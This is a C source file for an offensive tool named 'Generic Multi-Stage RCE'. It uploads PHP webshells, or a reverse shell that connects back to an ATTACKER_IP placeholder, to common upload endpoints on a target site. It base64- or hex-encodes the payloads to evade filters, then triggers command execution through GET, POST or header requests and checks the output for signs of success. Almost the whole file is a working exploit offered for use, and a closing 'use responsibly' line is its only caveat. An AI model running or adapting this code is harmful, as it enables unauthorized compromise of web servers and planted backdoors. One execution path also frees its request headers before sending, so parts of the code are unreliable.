#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <curl/curl.h>
#include <time.h>

#define MAX_URL          1024
#define MAX_CMD          1024
#define MAX_PAYLOAD      4096
#define MAX_ENDPOINTS    32
#define MAX_INDICATORS   64
#define TIMEOUT_MS       15000
#define SESSION_ID_LEN   16

/* ============================================================================
   TYPEN & STRUKTUREN
   ============================================================================ */

typedef enum {
    UPLOAD_MULTIPART,    // Multipart Form-Data Upload
    UPLOAD_QUERY,        // Query-Parameter Upload
    UPLOAD_JSON,         // JSON POST
    UPLOAD_RAW           // Raw POST Body
} upload_type_t;

typedef enum {
    EXEC_GET,            // GET request execution
    EXEC_POST,           // POST request execution
    EXEC_HEADER          // Execution via HTTP Header
} exec_type_t;

typedef enum {
    ENC_NONE,
    ENC_BASE64,
    ENC_HEX,
    ENC_BASE64_HEX,      // Base64(Hex(payload))
    ENC_DOUBLE_BASE64    // Base64(Base64(payload))
} encoding_type_t;

typedef struct {
    char *memory;
    size_t size;
} response_t;

typedef struct {
    char *name;
    char *value;
} param_t;

typedef struct {
    char path[512];
    upload_type_t type;
    char file_param[64];
    char file_name[128];
    param_t params[16];
    int param_count;
    int enabled;
} endpoint_t;

typedef struct {
    char path[512];
    exec_type_t type;
    char cmd_param[64];
    int enabled;
} exec_endpoint_t;

typedef struct {
    char *indicators[MAX_INDICATORS];
    int count;
    int (*custom_check)(const char *);
} success_indicator_t;

typedef struct {
    endpoint_t upload_endpoints[MAX_ENDPOINTS];
    int upload_count;
    exec_endpoint_t exec_endpoints[MAX_ENDPOINTS];
    int exec_count;
    success_indicator_t success_check;
    encoding_type_t encoding;
    char session_id[SESSION_ID_LEN + 1];
    int verbose;
} target_config_t;

/* ============================================================================
   CALLBACK & SPEICHER
   ============================================================================ */

static size_t write_callback(void *contents, size_t size, size_t nmemb, void *userp) {
    size_t realsize = size * nmemb;
    response_t *mem = (response_t *)userp;
    char *ptr = realloc(mem->memory, mem->size + realsize + 1);
    if (!ptr) {
        fprintf(stderr, "[-] Not enough memory for response\n");
        return 0;
    }
    mem->memory = ptr;
    memcpy(&mem->memory[mem->size], contents, realsize);
    mem->size += realsize;
    mem->memory[mem->size] = 0;
    return realsize;
}

/* ============================================================================
   ENCODING-FUNKTIONEN (Verbessert)
   ============================================================================ */

static const char b64_table[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

void base64_encode(const unsigned char *input, size_t len, char *output, size_t out_size) {
    size_t i = 0, j = 0;
    unsigned char a, b, c;

    while (i < len && j + 4 < out_size) {
        a = input[i++];
        b = i < len ? input[i++] : 0;
        c = i < len ? input[i++] : 0;

        output[j++] = b64_table[(a >> 2) & 0x3F];
        output[j++] = b64_table[(((a & 0x03) << 4) | (b >> 4)) & 0x3F];
        output[j++] = i - 1 < len ? b64_table[(((b & 0x0F) << 2) | (c >> 6)) & 0x3F] : '=';
        output[j++] = i < len ? b64_table[c & 0x3F] : '=';
    }
    output[j] = '\0';
}

void hex_encode(const unsigned char *input, size_t len, char *output, size_t out_size) {
    for (size_t i = 0; i < len && (i * 2 + 1) < out_size; i++) {
        snprintf(&output[i * 2], out_size - (i * 2), "%02x", input[i]);
    }
}

void encode_payload(const char *raw, encoding_type_t enc, char *output, size_t out_size) {
    size_t len = strlen(raw);
    char temp[MAX_PAYLOAD];

    switch (enc) {
        case ENC_NONE:
            strncpy(output, raw, out_size - 1);
            output[out_size - 1] = '\0';
            break;

        case ENC_BASE64:
            base64_encode((unsigned char *)raw, len, output, out_size);
            break;

        case ENC_HEX:
            hex_encode((unsigned char *)raw, len, output, out_size);
            break;

        case ENC_BASE64_HEX:
            hex_encode((unsigned char *)raw, len, temp, sizeof(temp));
            base64_encode((unsigned char *)temp, strlen(temp), output, out_size);
            break;

        case ENC_DOUBLE_BASE64:
            base64_encode((unsigned char *)raw, len, temp, sizeof(temp));
            base64_encode((unsigned char *)temp, strlen(temp), output, out_size);
            break;

        default:
            strncpy(output, raw, out_size - 1);
    }
}

/* ============================================================================
   PHP PAYLOAD-GENERATOR (Generic)
   ============================================================================ */

void generate_payload(const char *cmd, int is_reverse, char *output, size_t out_size) {
    if (is_reverse) {
        snprintf(output, out_size,
                 "<?php $sock=fsockopen(\"%s\",%d);$proc=proc_open(\"%s\",array(0=>$sock,1=>$sock,2=>$sock),$pipes);?>",
                 "ATTACKER_IP", 4444, cmd);
    } else {
        snprintf(output, out_size,
                 "<?php if(@$_GET['x']){system($_GET['x']);}else{system('%s');} ?>",
                 cmd);
    }
}

/* ============================================================================
   ERFOLGS-INDIKATOREN
   ============================================================================ */

int default_rce_check(const char *response) {
    if (!response || strlen(response) == 0) return 0;

    const char *indicators[] = {
        "uid=", "gid=", "root:", "Linux", "version",
        "Windows", "SYSTEM", "Administrator",
        "command executed", "shell_exec", "whoami",
        NULL
    };

    for (int i = 0; indicators[i]; i++) {
        if (strstr(response, indicators[i])) return 1;
    }
    return 0;
}

int check_success(const char *response, success_indicator_t *check) {
    if (!response) return 0;

    // Custom Check
    if (check->custom_check && check->custom_check(response)) {
        return 1;
    }

    // Standard Indicators
    for (int i = 0; i < check->count && check->indicators[i]; i++) {
        if (strstr(response, check->indicators[i])) {
            return 1;
        }
    }

    return 0;
}

/* ============================================================================
   UPLOAD-STAGE
   ============================================================================ */

int upload_stage(const char *base, endpoint_t *ep, const char *cmd, 
                 target_config_t *config, response_t *resp) {
    CURL *curl = curl_easy_init();
    if (!curl) return 0;

    char url[MAX_URL];
    snprintf(url, sizeof(url), "%s%s", base, ep->path);

    char payload[MAX_PAYLOAD];
    int is_reverse = (strstr(cmd, "bash -i") || strstr(cmd, "/dev/tcp"));
    generate_payload(cmd, is_reverse, payload, sizeof(payload));

    char encoded[MAX_PAYLOAD];
    encode_payload(payload, config->encoding, encoded, sizeof(encoded));

    response_t chunk = { .memory = malloc(1), .size = 0 };
    chunk.memory[0] = 0;

    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)&chunk);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT_MS, TIMEOUT_MS);
    curl_easy_setopt(curl, CURLOPT_USERAGENT, "Mozilla/5.0 (Generic-RCE/4.5)");
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);

    int success = 0;
    long http_code = 0;

    switch (ep->type) {
        case UPLOAD_MULTIPART: {
            curl_mime *mime = curl_mime_init(curl);
            curl_mimepart *part;

            // Add parameters
            for (int i = 0; i < ep->param_count; i++) {
                part = curl_mime_addpart(mime);
                curl_mime_name(part, ep->params[i].name);
                curl_mime_data(part, ep->params[i].value, CURL_ZERO_TERMINATED);
            }

            // Add file
            part = curl_mime_addpart(mime);
            curl_mime_name(part, ep->file_param);
            curl_mime_data(part, encoded, strlen(encoded));
            curl_mime_filename(part, ep->file_name);
            curl_mime_type(part, "application/octet-stream");

            curl_easy_setopt(curl, CURLOPT_MIMEPOST, mime);
            curl_easy_perform(curl);
            curl_mime_free(mime);
            break;
        }

        case UPLOAD_QUERY: {
            char full_url[MAX_URL * 2];
            snprintf(full_url, sizeof(full_url), "%s?%s=%s", url, ep->file_param, encoded);
            curl_easy_setopt(curl, CURLOPT_URL, full_url);
            curl_easy_perform(curl);
            break;
        }

        case UPLOAD_JSON: {
            struct curl_slist *headers = NULL;
            headers = curl_slist_append(headers, "Content-Type: application/json");
            char json_body[MAX_PAYLOAD];
            snprintf(json_body, sizeof(json_body), "{\"%s\":\"%s\"}", ep->file_param, encoded);
            curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
            curl_easy_setopt(curl, CURLOPT_POSTFIELDS, json_body);
            curl_easy_perform(curl);
            curl_slist_free_all(headers);
            break;
        }

        case UPLOAD_RAW: {
            curl_easy_setopt(curl, CURLOPT_POSTFIELDS, encoded);
            curl_easy_perform(curl);
            break;
        }
    }

    curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &http_code);

    if (config->verbose) {
        printf("[*] Upload to %s (HTTP %ld) - Response size: %zu bytes\n",
               url, http_code, chunk.size);
        if (chunk.size > 0 && chunk.size < 200) {
            printf("    Response: %.200s\n", chunk.memory);
        }
    }

    if (http_code >= 200 && http_code < 300) {
        printf("[+] UPLOAD SUCCESS: %s (HTTP %ld)\n", url, http_code);
        if (check_success(chunk.memory, &config->success_check)) {
            printf("[!!!] EARLY RCE DETECTED IN UPLOAD RESPONSE\n");
            success = 1;
        }
    } else {
        printf("[-] Upload failed: HTTP %ld\n", http_code);
    }

    if (resp) {
        resp->memory = chunk.memory;
        resp->size = chunk.size;
    } else {
        free(chunk.memory);
    }

    curl_easy_cleanup(curl);
    return success;
}

/* ============================================================================
   EXECUTION-STAGE
   ============================================================================ */

int execution_stage(const char *base, exec_endpoint_t *ep, const char *cmd,
                    target_config_t *config, response_t *resp) {
    CURL *curl = curl_easy_init();
    if (!curl) return 0;

    char url[MAX_URL * 2];
    response_t chunk = { .memory = malloc(1), .size = 0 };
    chunk.memory[0] = 0;

    switch (ep->type) {
        case EXEC_GET:
            snprintf(url, sizeof(url), "%s%s?%s=%s", base, ep->path, ep->cmd_param, cmd);
            curl_easy_setopt(curl, CURLOPT_URL, url);
            break;

        case EXEC_POST: {
            snprintf(url, sizeof(url), "%s%s", base, ep->path);
            char post_data[MAX_PAYLOAD];
            snprintf(post_data, sizeof(post_data), "%s=%s", ep->cmd_param, cmd);
            curl_easy_setopt(curl, CURLOPT_URL, url);
            curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post_data);
            break;
        }

        case EXEC_HEADER: {
            snprintf(url, sizeof(url), "%s%s", base, ep->path);
            struct curl_slist *headers = NULL;
            char header_val[512];
            snprintf(header_val, sizeof(header_val), "X-Command: %s", cmd);
            headers = curl_slist_append(headers, header_val);
            curl_easy_setopt(curl, CURLOPT_URL, url);
            curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
            curl_slist_free_all(headers);
            break;
        }
    }

    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)&chunk);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT_MS, TIMEOUT_MS);
    curl_easy_setopt(curl, CURLOPT_USERAGENT, "Mozilla/5.0");
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);

    curl_easy_perform(curl);

    long http_code = 0;
    curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &http_code);

    int success = 0;
    if (http_code == 200 && check_success(chunk.memory, &config->success_check)) {
        printf("[!!!] EXECUTION SUCCESS: %s\n", url);
        printf("[+] Output:\n%s\n", chunk.memory);
        success = 1;
    } else if (config->verbose) {
        printf("[?] Exec attempt: %s (HTTP %ld, %zu bytes)\n", url, http_code, chunk.size);
    }

    if (resp) {
        resp->memory = chunk.memory;
        resp->size = chunk.size;
    } else {
        free(chunk.memory);
    }

    curl_easy_cleanup(curl);
    return success;
}

/* ============================================================================
   KONFIGURATION & SETUP
   ============================================================================ */

void init_generic_config(target_config_t *config) {
    config->upload_count = 0;
    config->exec_count = 0;
    config->encoding = ENC_BASE64;
    config->verbose = 0;
    config->success_check.custom_check = default_rce_check;
    config->success_check.count = 0;

    // Session-ID generieren
    srand(time(NULL));
    for (int i = 0; i < SESSION_ID_LEN; i++) {
        config->session_id[i] = "abcdefghijklmnopqrstuvwxyz0123456789"[rand() % 36];
    }
    config->session_id[SESSION_ID_LEN] = '\0';
}

void add_upload_endpoint(target_config_t *config, const char *path, upload_type_t type,
                         const char *file_param, const char *file_name) {
    if (config->upload_count >= MAX_ENDPOINTS) return;
    
    endpoint_t *ep = &config->upload_endpoints[config->upload_count++];
    strncpy(ep->path, path, sizeof(ep->path) - 1);
    ep->type = type;
    strncpy(ep->file_param, file_param, sizeof(ep->file_param) - 1);
    strncpy(ep->file_name, file_name, sizeof(ep->file_name) - 1);
    ep->param_count = 0;
    ep->enabled = 1;
}

void add_upload_param(target_config_t *config, const char *name, const char *value) {
    if (config->upload_count == 0) return;
    endpoint_t *ep = &config->upload_endpoints[config->upload_count - 1];
    if (ep->param_count >= 16) return;
    
    ep->params[ep->param_count].name = malloc(strlen(name) + 1);
    ep->params[ep->param_count].value = malloc(strlen(value) + 1);
    strcpy(ep->params[ep->param_count].name, name);
    strcpy(ep->params[ep->param_count].value, value);
    ep->param_count++;
}

void add_exec_endpoint(target_config_t *config, const char *path, exec_type_t type,
                       const char *cmd_param) {
    if (config->exec_count >= MAX_ENDPOINTS) return;
    
    exec_endpoint_t *ep = &config->exec_endpoints[config->exec_count++];
    strncpy(ep->path, path, sizeof(ep->path) - 1);
    ep->type = type;
    strncpy(ep->cmd_param, cmd_param, sizeof(ep->cmd_param) - 1);
    ep->enabled = 1;
}

void add_success_indicator(target_config_t *config, const char *indicator) {
    if (config->success_check.count >= MAX_INDICATORS) return;
    config->success_check.indicators[config->success_check.count] = malloc(strlen(indicator) + 1);
    strcpy(config->success_check.indicators[config->success_check.count], indicator);
    config->success_check.count++;
}

/* ============================================================================
   MAIN SCAN-LOGIK
   ============================================================================ */

int main(int argc, char **argv) {
    if (argc < 2) {
        printf("Usage: %s <base_url> [command] [encoding] [verbose]\n", argv[0]);
        printf("\nEncodings:\n");
        printf("  none           - No encoding\n");
        printf("  base64         - Base64 encoding\n");
        printf("  hex            - Hex encoding\n");
        printf("  base64_hex     - Base64(Hex(payload))\n");
        printf("  double_base64  - Base64(Base64(payload))\n");
        printf("\nExample:\n");
        printf("  %s http://target.local \"id\" base64 1\n", argv[0]);
        printf("  %s http://target.local \"whoami\" hex 0\n", argv[0]);
        return 1;
    }

    curl_global_init(CURL_GLOBAL_ALL);

    const char *base = argv[1];
    const char *cmd = (argc >= 3) ? argv[2] : "id";
    const char *enc_str = (argc >= 4) ? argv[3] : "base64";
    int verbose = (argc >= 5) ? atoi(argv[4]) : 0;

    // Encoding auswählen
    encoding_type_t encoding = ENC_BASE64;
    if (strcmp(enc_str, "none") == 0) encoding = ENC_NONE;
    else if (strcmp(enc_str, "hex") == 0) encoding = ENC_HEX;
    else if (strcmp(enc_str, "base64_hex") == 0) encoding = ENC_BASE64_HEX;
    else if (strcmp(enc_str, "double_base64") == 0) encoding = ENC_DOUBLE_BASE64;

    target_config_t config;
    init_generic_config(&config);
    config.encoding = encoding;
    config.verbose = verbose;

    printf("=== Generic Multi-Stage RCE v4.5 ===\n");
    printf("Target: %s\n", base);
    printf("Command: %s\n", cmd);
    printf("Encoding: %s\n", enc_str);
    printf("Session ID: %s\n\n", config.session_id);

    /* ========== STAGE 1: UPLOAD-ENDPUNKTE ==========
       Hier können beliebig viele generische Upload-Wege konfiguriert werden
    */

    // Generic PHP Upload (multipart)
    add_upload_endpoint(&config, "/upload.php", UPLOAD_MULTIPART, "file", "shell.php");
    
    // Generic API Upload (JSON)
    add_upload_endpoint(&config, "/api/upload", UPLOAD_JSON, "payload", "payload.php");
    add_upload_param(&config, "token", config.session_id);

    // Query-basierter Upload
    add_upload_endpoint(&config, "/submit.php", UPLOAD_QUERY, "data", "data.bin");

    printf("[*] Configured %d upload endpoints\n", config.upload_count);

    int upload_hits = 0;
    for (int i = 0; i < config.upload_count; i++) {
        if (config.upload_endpoints[i].enabled) {
            printf("\n[Stage 1.%d] Attempting upload to: %s\n", i + 1, config.upload_endpoints[i].path);
            response_t resp = {0};
            if (upload_stage(base, &config.upload_endpoints[i], cmd, &config, &resp)) {
                upload_hits++;
            }
            if (resp.memory) free(resp.memory);
        }
    }

    /* ========== STAGE 2: EXECUTION-ENDPUNKTE ==========
       Multi-Path Execution Attempts
    */

    // Success Indicators hinzufügen
    add_success_indicator(&config, "uid=");
    add_success_indicator(&config, "gid=");
    add_success_indicator(&config, "Linux");

    add_exec_endpoint(&config, "/shell.php", EXEC_GET, "cmd");
    add_exec_endpoint(&config, "/api/execute", EXEC_POST, "command");
    add_exec_endpoint(&config, "/exec", EXEC_HEADER, "command");

    printf("\n[*] Configured %d execution endpoints\n", config.exec_count);

    int exec_hits = 0;
    for (int i = 0; i < config.exec_count; i++) {
        if (config.exec_endpoints[i].enabled) {
            printf("\n[Stage 2.%d] Attempting execution on: %s\n", i + 1, config.exec_endpoints[i].path);
            response_t resp = {0};
            if (execution_stage(base, &config.exec_endpoints[i], cmd, &config, &resp)) {
                exec_hits++;
            }
            if (resp.memory) free(resp.memory);
        }
    }

    printf("\n=== Scan Summary ===\n");
    printf("Upload successes: %d / %d\n", upload_hits, config.upload_count);
    printf("Execution successes: %d / %d\n", exec_hits, config.exec_count);
    printf("Total hits: %d\n\n", upload_hits + exec_hits);

    printf("Note: For reverse shells, verify success in your listener.\n");
    printf("Use responsibly and only with proper authorization!\n");

    curl_global_cleanup();
    return (upload_hits + exec_hits > 0) ? 0 : 1;
}
